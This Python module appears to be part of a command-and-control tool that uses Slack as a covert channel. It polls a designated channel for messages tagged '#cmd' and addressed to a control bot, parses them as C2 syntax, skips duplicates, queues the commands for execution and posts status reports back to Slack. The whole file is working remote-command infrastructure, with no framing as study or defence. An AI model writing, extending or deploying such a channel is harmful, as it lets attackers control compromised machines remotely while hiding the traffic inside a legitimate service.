import requests, json
from pprint import pprint

import urllib.parse
import html

from . import messages
from . import sender
from . import utils
from . import execute



class Searching():
    """docstring for Searching"""
    def __init__(self, options):
        self.options = options
        
    def search_cmd(self):
        data = self.search_message(text='#cmd')

        # pprint(data)

        query = data['query']
        total = data['messages']['total']

        if total == 0:
            utils.print_bad("No message matched ...")
            return

        matches = data['messages']['matches']

        #found irc message
        for item in matches:
            content = item['text']
            #check if the message was a c2 syntax
            if self.options['control_bot'] in content:
                if utils.check_c2_systax(content):
                    utils.print_info("Cheking these message: {0}".format(content))
                    cmd, out, nid = utils.check_c2_systax(content)
                    #check duplicate and run it
                    self.process_irc_message(cmd, out, nid)



    def process_irc_message(self, cmd, out, nid):
        # #check if duplicate or not
        # utils.print_info("Cheking these command: {0}".format(cmd))
        if self.checking_status(cmd):
            # print('== Gonna execute it ---')
            process_item = {
                'cmd' : cmd,
                'out' : out,
                'nid' : nid
            }
            #put the process to a queue
            self.options['process_queue'].put_cmd_to_queue(process_item)


            #create a status
            if out != '':
                sm = messages.Messages(self.options)
                mess = {
                    'title' : 'Execute Command with output',
                    # 'author_name' : out,
                    'content' : cmd + "\n" + out
                }
                sm.send_good(mess)
                utils.print_good('Execute Command with output: {0}'.format(cmd))

            else:
                sm = messages.Messages(self.options)
                mess = {
                    'title' : 'Execute Command',
                    'content' : cmd
                }
                sm.send_good(mess)
                utils.print_good('Execute Command: {0}'.format(cmd))

            
    def checking_status(self, cmd):
        #check if duplicate or not
        status_channel = self.options['status_channel_name']
        query = "Execute Command in:{1}".format(cmd, status_channel)
        data = self.custom_search(query)
        total = data['messages']['total']

        # print(total)

        if total > 0:
            matches = data['messages']['matches']
            for item in matches:
                if 'attachments' in item.keys():
                    try:
                        #need to check for page
                        if html.unescape(item['attachments'][0]['text']) == cmd:
                            return False
                    except:
                        pass

            return True

        return True

    ####really search
    def custom_search(self, query):
        data = self.search_message(query=query)
        return data


    def search_message(self, text='', query=''):
        token = self.options['user_token']
        irc = self.options['irc_channel_name']

        # if query != '' search direct query
        if query == '':
            query = "{0} in:{1}".format(text, irc)

        #url encode
        query = urllib.parse.quote(query)

        url = "https://slack.com:443/api/search.messages?query={0}&count=100&pretty=1".format(query)
        r = sender.send_GET(url, token)
        if r.status_code == 200:
            data = json.loads(r.text)

        return data